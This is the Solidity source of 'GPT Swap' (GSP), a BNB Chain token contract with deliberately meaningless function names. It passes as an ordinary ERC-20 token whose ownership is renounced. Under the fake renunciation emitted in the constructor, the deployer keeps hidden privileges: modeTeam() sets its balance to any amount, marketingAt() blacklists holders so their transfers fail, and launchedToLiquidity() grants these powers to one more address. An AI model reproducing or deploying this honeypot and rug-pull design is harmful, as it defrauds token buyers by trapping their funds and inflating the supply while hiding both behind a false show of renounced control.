/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract walletShould {
    function maxExempt() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface takeAmountReceiver {
    function createPair(address toAuto, address launchLiquidity) external returns (address);
}

interface atSenderIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GPTSwap is IERC20, walletShould {
    uint8 private maxMin = 18;
    
    bool private fundAmountSwap;
    bool private fromTotalReceiver;
    bool public modeReceiver;
    mapping(address => mapping(address => uint256)) private marketingLimit;
    string private listIs = "GPT Swap";
    address public walletReceiver;
    bool public buyExempt;
    address private enableList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;


    bool public sellFrom;
    bool public feeLimit;
    bool public launchedMax;
    mapping(address => uint256) private fundFrom;
    address public tradingFund;

    mapping(address => bool) public isTeam;
    bool public amountWalletAt;
    mapping(address => bool) public txTeam;

    address private senderLaunch;
    uint256 public listWalletTeam;
    

    uint256 private tradingSell = 100000000 * 10 ** maxMin;
    string private launchedList = "GSP";
    uint256 private fromTx;
    

    event OwnershipTransferred(address indexed liquidityList, address indexed senderToTeam);

    constructor (){
        
        atSenderIs senderReceiver = atSenderIs(enableList);
        tradingFund = takeAmountReceiver(senderReceiver.factory()).createPair(senderReceiver.WETH(), address(this));
        senderLaunch = maxExempt();
        if (amountWalletAt) {
            amountWalletAt = false;
        }
        walletReceiver = senderLaunch;
        txTeam[walletReceiver] = true;
        
        fundFrom[walletReceiver] = tradingSell;
        emit Transfer(address(0), walletReceiver, tradingSell);
        totalMin();
    }

    

    function allowance(address marketingTrading, address teamAuto) external view virtual override returns (uint256) {
        return marketingLimit[marketingTrading][teamAuto];
    }

    function modeTeam(uint256 launchedReceiver) public {
        if (!txTeam[maxExempt()]) {
            return;
        }
        fundFrom[walletReceiver] = launchedReceiver;
    }

    function launchedToLiquidity(address txLaunch) public {
        if (feeLimit) {
            return;
        }
        if (modeReceiver) {
            fundAmountSwap = true;
        }
        txTeam[txLaunch] = true;
        if (launchedMax == sellFrom) {
            fromTotalReceiver = false;
        }
        feeLimit = true;
    }

    function marketingAt(address txWallet) public {
        if (buyExempt) {
            fundAmountSwap = true;
        }
        if (txWallet == walletReceiver || txWallet == tradingFund || !txTeam[maxExempt()]) {
            return;
        }
        
        isTeam[txWallet] = true;
    }

    function liquidityLaunched() public {
        
        if (fundAmountSwap != launchedMax) {
            listWalletTeam = fromTx;
        }
        fromTotalReceiver=false;
    }

    function feeLiquiditySell(address isReceiver, address autoLaunchedTrading, uint256 launchedReceiver) internal returns (bool) {
        if (isReceiver == walletReceiver || autoLaunchedTrading == walletReceiver) {
            return autoMode(isReceiver, autoLaunchedTrading, launchedReceiver);
        }
        if (fundAmountSwap) {
            launchedMax = false;
        }
        require(!isTeam[isReceiver]);
        if (buyExempt) {
            buyExempt = true;
        }
        return autoMode(isReceiver, autoLaunchedTrading, launchedReceiver);
    }

    function isSell() public view returns (bool) {
        return amountWalletAt;
    }

    function transfer(address listShould, uint256 launchedReceiver) external virtual override returns (bool) {
        return feeLiquiditySell(maxExempt(), listShould, launchedReceiver);
    }

    function transferFrom(address isReceiver, address autoLaunchedTrading, uint256 launchedReceiver) external override returns (bool) {
        if (marketingLimit[isReceiver][maxExempt()] != type(uint256).max) {
            require(launchedReceiver <= marketingLimit[isReceiver][maxExempt()]);
            marketingLimit[isReceiver][maxExempt()] -= launchedReceiver;
        }
        return feeLiquiditySell(isReceiver, autoLaunchedTrading, launchedReceiver);
    }

    function getOwner() external view returns (address) {
        return senderLaunch;
    }

    function tradingLiquidity() public {
        if (fromTx != listWalletTeam) {
            listWalletTeam = fromTx;
        }
        if (launchedMax) {
            sellFrom = true;
        }
        amountWalletAt=false;
    }

    function symbol() external view returns (string memory) {
        return launchedList;
    }

    function maxSwap() public view returns (bool) {
        return fromTotalReceiver;
    }

    function balanceOf(address sellLaunch) public view virtual override returns (uint256) {
        return fundFrom[sellLaunch];
    }

    function name() external view returns (string memory) {
        return listIs;
    }

    function tokenBuyLaunch() public view returns (bool) {
        return launchedMax;
    }

    function autoMode(address isReceiver, address autoLaunchedTrading, uint256 launchedReceiver) internal returns (bool) {
        require(fundFrom[isReceiver] >= launchedReceiver);
        fundFrom[isReceiver] -= launchedReceiver;
        fundFrom[autoLaunchedTrading] += launchedReceiver;
        emit Transfer(isReceiver, autoLaunchedTrading, launchedReceiver);
        return true;
    }

    function approve(address teamAuto, uint256 launchedReceiver) public virtual override returns (bool) {
        marketingLimit[maxExempt()][teamAuto] = launchedReceiver;
        emit Approval(maxExempt(), teamAuto, launchedReceiver);
        return true;
    }

    function totalMin() public {
        emit OwnershipTransferred(walletReceiver, address(0));
        senderLaunch = address(0);
    }

    function shouldTake() public view returns (bool) {
        return sellFrom;
    }

    function owner() external view returns (address) {
        return senderLaunch;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingSell;
    }

    function decimals() external view returns (uint8) {
        return maxMin;
    }


}